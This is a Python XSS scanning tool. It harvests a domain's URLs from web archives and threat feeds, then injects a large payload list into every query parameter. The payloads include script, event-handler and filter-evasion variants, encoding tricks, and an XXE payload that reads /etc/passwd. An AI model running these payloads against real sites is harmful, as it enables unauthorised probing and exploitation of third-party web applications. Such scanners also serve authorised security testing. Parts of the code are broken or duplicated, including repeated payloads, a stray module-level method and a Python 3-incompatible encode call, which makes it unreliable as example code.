import threading
import sys
import requests
import argparse
import numpy as np
import sqlite3
import signal
from datetime import datetime
import time
import base64
from functools import partial
from concurrent.futures import ThreadPoolExecutor
from jinja2 import Environment, FileSystemLoader
from urllib.parse import urlparse, parse_qs

cursor = "|"

def animate_cursor():
    global cursor
    while True:
        cursor = "|"
        time.sleep(0.5)
        cursor = " "
        time.sleep(0.5)

cursor_thread = threading.Thread(target=animate_cursor)
cursor_thread.daemon = True
cursor_thread.start()
print(f"Loading{cursor}", end='\r')

current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
requests.packages.urllib3.disable_warnings()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '"><img src="x" onerror="alert(\'XSS\')" />',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    # ... (previous payloads)
    '<img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    # XSS Locator (Polygot)
    '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
    # Malformed A Tags
    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
    # Malformed IMG Tags
    '<img foo=a src="javascript:alert(\'XSS\')">',
    '<img foo=a onerror="alert(\'XSS\')">',
    # fromCharCode
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
    # Default SRC Tag to Get Past Filters that Check SRC Domain
    '<img src="http://example.com/image.jpg">',
    # Default SRC Tag by Leaving it Empty
    '<img src="">',
    # Default SRC Tag by Leaving it out Entirely
    '<img>',
    # On Error Alert
    '<img src=x onerror=alert("XSS")>',
    # IMG onerror and JavaScript Alert Encode
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    # Decimal HTML Character References
    '&#34;><img src=x onerror=alert(\'XSS\')>',
    # Decimal HTML Character References Without Trailing Semicolons
    '&#34><img src=x onerror=alert(\'XSS\')>',
    # Hexadecimal HTML Character References Without Trailing Semicolons
    '&#x22><img src=x onerror=alert(\'XSS\')>',
    # List-style-image
    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
    # VBscript in an Image
    '<img src="vbscript:alert(\'XSS\')">',
    # SVG Object Tag
    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
    # ECMAScript 6
    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
    # BODY Tag
    '<BODY ONLOAD=alert(\'XSS\')>',
    # <BODY ONLOAD=alert('XSS')>
    '<BODY ONLOAD=alert(\'XSS\')>',
    # Event Handlers
    '<img onmouseover="alert(\'XSS\')" src="x">',
    # Various Tags with Broken-up for XSS
    '<s<Sc<script>ript>alert(\'XSS\')</script>',
    # TABLE
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    # TD
    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
    # DIV
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    # BASE TAG
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    # OBJECT TAG
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
    # SSI XSS
    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
    # HTML+TIME IN XML
    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    # Using ActionScript Inside Flash
    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
    # MIME
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

obfuscation_methods = [
    lambda payload: payload,  # No obfuscation
    lambda payload: payload.replace("alert", "confirm") if payload else payload,
    lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,  # Hex encoding
    lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,  # Unicode encoding
    lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,  # Base64 encoding
    lambda payload: payload.encode('utf-16').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
    lambda payload: payload.encode('utf-32').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
    lambda payload: payload.encode('rot_13').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
    lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,  # Percent encoding
    lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,  # HTML Entity encoding
    lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c') if payload is not None and isinstance(payload, str) else payload,  # Null Byte encoding
    lambda payload: payload.encode('base64').decode(errors='ignore') if payload is not None else None,    # Base64 encoding
    lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload is not None else None,    # UTF-16 Little-Endian encoding
    lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload is not None else None,    # UTF-32 Little-Endian encoding
    lambda payload: payload[::-1] if payload is not None else payload,   # Reverse the payload
    lambda payload: payload.upper() if payload is not None else payload,    # Convert to uppercase
    lambda payload: payload.lower() if payload is not None else payload,    # Convert to lowercase
    lambda payload: payload.swapcase() if payload is not None else payload,    # Swap case (upper to lower and vice versa)
    lambda payload: "".join(f"%u{ord(char):04X}" for char in payload) if payload else payload,  # Percent-Encoded Unicode
    lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,  # Percent-Encoded ASCII
  # Additional obfuscation methods
    lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,  # Uppercase Percent-Encoded Unicode
    lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,  # Uppercase Percent-Encoded Unicode
    lambda payload: "".join(f"%{ord(char):02X}; " for char in payload) if payload else payload,  # Percent Encoding with Spaces
    lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,  # Unicode Percent Encoding with Spaces
    lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;') if payload is not None else payload,  # HTML Entity Encoding for < and >
    lambda payload: payload.replace('"', '&quot;').replace('\'', '&#39;') if payload is not None else payload,  # HTML Entity Encoding for " and '
    lambda payload: "".join(f"\\{char}" for char in payload) if payload is not None else payload,  # Single Backslash Escaping
    lambda payload: "".join(f"\\\{char}" for char in payload) if payload is not None else payload,  # Double Backslash Escaping
    lambda payload: "".join(f"%{ord(char):X} " for char in payload) if payload else payload,  # Percent Encoding with Spaces
    lambda payload: "".join(f"&#x{ord(char):X} " for char in payload) if payload else payload,  # HTML Entity Encoding with Spaces
]

def get_arguments():
    parser = argparse.ArgumentParser(description='Advanced XSS Reporter')
    parser.add_argument("-t", "--thread", dest="thread", help="Number of Threads to Use. Default=50", default=50)
    parser.add_argument("-o", "--output", dest="output", help="Save Vulnerable URLs in TXT file")
    parser.add_argument("-s", "--subs", dest="want_subdomain", help="Include Results of Subdomains", action='store_true')
    parser.add_argument("--deepcrawl", dest="deepcrawl", help="Uses All Available APIs of CommonCrawl for Crawling URLs [**Takes Time**]", action='store_true')
    parser.add_argument("--report", dest="report_file", help="Generate an HTML report", default=None)
    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-l", "--list", dest="url_list", help="URLs List, e.g., google_urls.txt")
    required_arguments.add_argument("-d", "--domain", dest="domain", help="Target Domain Name, e.g., testphp.vulnweb.com")
    return parser.parse_args()

def readTargetFromFile(filepath):
    urls_list = []
    with open(filepath, "r") as f:
        for urls in f.readlines():
            if urls.strip():
                urls_list.append(urls.strip())
    return urls_list

def start(self):
    print(f"[{current_time}] Now implementing logics to capture XSS vulnerabilities on given links")
    self.url_list = list(set(self.url_list))
    
    # Create a partially applied function for scanning with payloads
    scan_urls_with_payload = partial(self.scan_urls_for_xss, payload=self.payload)

    with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
        results = list(executor.map(self.scan_urls_for_xss, [(url, self.payload) for url in self.url_list]))
    
    self.vulnerable_urls = [url for sublist in results for url in sublist]
    
    if self.report_file:
        self.store_vulnerabilities_in_sqlite()
        self.generate_report()
    
    return self.vulnerable_urls

class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()

    def start(self):
        if self.deepcrawl:
            self.startDeepCommonCrawl()
        else:
            self.getCommonCrawlURLs(self.domain, self.want_subdomain, ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"])
        urls_list1 = self.getWaybackURLs(self.domain, self.want_subdomain)
        urls_list2 = self.getOTX_URLs(self.domain)
        self.final_url_list.update(urls_list1)
        self.final_url_list.update(urls_list2)
        return list(self.final_url_list)

    def getIdealDomain(self, domainName):
        final_domain = domainName.replace("http://", "")
        final_domain = final_domain.replace("https://", "")
        final_domain = final_domain.replace("/", "")
        final_domain = final_domain.replace("www", "")
        return final_domain

    def split_list(self, list_name, total_part_num):
        final_list = []
        split = np.array_split(list_name, total_part_num)
        for array in split:
            final_list.append(list(array))
        return final_list

    def make_GET_Request(self, url, response_type):
        response = requests.get(url)
        if response_type.lower() == "json":
            result = response.json()
        else:
            result = response.text
        return result

    def getWaybackURLs(self, domain, want_subdomain):
        if want_subdomain:
            wild_card = "*."
        else:
            wild_card = ""
        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        try:
            urls_list.pop(0)
        except:
            pass
        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url[0])
        return list(final_urls_list)

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        urls_list = raw_urls["url_list"]
        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url["url"])
        return list(final_urls_list)

    def startDeepCommonCrawl(self):
        api_list = self.get_all_api_CommonCrawl()
        collection_of_api_list = self.split_list(api_list, int(self.threadNumber))
        thread_list = []
        for thread_num in range(int(self.threadNumber)):
            t = threading.Thread(target=self.getCommonCrawlURLs, args=(self.domain, self.want_subdomain, collection_of_api_list[thread_num],))
            thread_list.append(t)
        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

    def get_all_api_CommonCrawl(self):
        url = "http://index.commoncrawl.org/collinfo.json"
        raw_api = self.make_GET_Request(url, "json")
        final_api_list = []
        for items in raw_api:
            final_api_list.append(items["cdx-api"])
        return final_api_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        if want_subdomain:
            wild_card = "*."
        else:
            wild_card = ""
        final_urls_list = set()
        for api in apiList:
            url = f"{api}?url={wild_card+domain}/*&fl=url"
            raw_urls = self.make_GET_Request(url, "text")
            if ("No Captures found for:" not in raw_urls) and ("<title>" not in raw_urls):
                urls_list = raw_urls.split("\n")
                for url in urls_list:
                    if url != "":
                        final_urls_list.add(url)
        return list(final_urls_list)

class XSSScanner:
    def __init__(self, url_list, threadNumber, report_file, payload=None):
        self.url_list = url_list
        self.threadNumber = threadNumber
        self.vulnerable_urls = []
        self.report_file = report_file
        self.payload = payload
        self.stop_scan = False
        signal.signal(signal.SIGINT, self.handle_ctrl_c)

    def handle_ctrl_c(self, signum, frame):
        print("Ctrl+C detected. Stopping the scan.")
        self.stop_scan = True

    def start(self):
        print(f"[{current_time}] Now implementing logics to capture XSS vulnerabilities on given links")
        self.url_list = list(set(self.url_list))
        with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
            results = list(executor.map(self.scan_urls_for_xss, self.url_list))
        self.vulnerable_urls = [url for sublist in results for url in sublist]
        if self.report_file:
            self.store_vulnerabilities_in_sqlite()
            self.generate_report()
        return self.vulnerable_urls

    def scan_urls_for_xss(self, url):
        vulnerable_payloads = []
        
        # Define a list of keywords that suggest file-related parameters
        file_related_keywords = ["file", "path", "image", "download", "widget-scripts", "preloaded-modules", "jquery.magnific-popup", "widget-scripts", "jquery.magnific-popup", "preloaded-modules", "widget-scripts", "jquery.magnific-popup", "widget-scripts", "jquery.magnific-popup.min", "preloaded-modules.min", "jquery.magnific-popup.min"]

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        # Iterate through query parameters
        for param, values in query_params.items():
            if any(keyword in param.lower() for keyword in file_related_keywords):
                # Skip this parameter, as it's likely related to file handling
                continue

            for payload in xss_payloads:
                payload_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(payload_url, verify=False, timeout=10)

                    if self.stop_scan:
                        return vulnerable_payloads

                    if response.status_code == 200 and payload in response.text:
                        print(f"Potential XSS vulnerability found in URL: {payload_url} with payload: {payload}")
                        vulnerable_payloads.append((payload_url, payload))
                except Exception as e:
                    pass

        return vulnerable_payloads

    def test_xss_vulnerabilities(self, url, payload):
        vulnerable_urls = []
        if self.stop_scan:
            return vulnerable_urls

        best_obfuscation = None
        max_successful_injections = 0

        for obfuscate in obfuscation_methods:
            obfuscated_payload = obfuscate(payload)

            if obfuscated_payload:
                payload_url = url + "?" + obfuscated_payload
                print(f"[{current_time}] Testing URL: {payload_url} Cursor: {cursor}", end='\r')
                try:
                    response = requests.get(payload_url, verify=False, timeout=10)

                    if self.stop_scan:
                        return vulnerable_urls

                    if response.status_code == 200 and "alert" in response.text:
                        successful_injections = response.text.count("alert")
                        if successful_injections > max_successful_injections:
                            max_successful_injections = successful_injections
                            best_obfuscation = obfuscate.__name__
                        vulnerable_urls.append(payload_url)
                except Exception as e:
                    pass

        if best_obfuscation:
            print(f"[{current_time}] Suitable obfuscation method found for {url}: {best_obfuscation}")
        else:
            pass
            #fprint(f"[{current_time}] No successful obfuscation method found for {url}")

        return vulnerable_urls

    def store_vulnerabilities_in_sqlite(self):
        conn = sqlite3.connect("xss_vulnerabilities.db")
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS vulnerabilities (url TEXT)")
        conn.commit()

        for url in self.vulnerable_urls:
            cursor.execute("INSERT INTO vulnerabilities (url) VALUES (?)", (url,))
            conn.commit()

        conn.close()

    def generate_report(self):
        env = Environment(loader=FileSystemLoader('.'))
        template = env.get_template('report_template.html')
        report_content = template.render(vulnerable_urls=self.vulnerable_urls)

        with open(self.report_file, "w") as f:
            f.write(report_content)

if __name__ == '__main__':
    arguments = get_arguments()

    if arguments.domain:
        print(f"[{current_time}] Collecting URLs from WaybackMachine, AlienVault OTX, CommonCrawl")
        crawl = PassiveCrawl(arguments.domain, arguments.want_subdomain, arguments.thread, arguments.deepcrawl)
        final_url_list = crawl.start()
    elif arguments.url_list:
        final_url_list = readTargetFromFile(arguments.url_list)
    else:
        print("[!] Please Specify --domain or --list flag ..")
        print(f"[*] Type: {sys.argv[0]} --help")
        sys.exit()

    scan = XSSScanner(final_url_list, arguments.thread, arguments.report_file)  # Create XSSScanner object
    vulnerable_urls = scan.start()  # Start scanning for XSS vulnerabilities

    total_links_audited = len(final_url_list)
    with open('total_links_audited.txt', 'w') as file:
        file.write(str(total_links_audited))  # Write the total number of links audited to a text file

    print(f"[{current_time}] Total Links Audited: ", total_links_audited)

    for url in vulnerable_urls:
        print(url)
    print(f"[{current_time}] Total Confirmed Cross Site Scripting Vulnerabilities: ", len(vulnerable_urls))
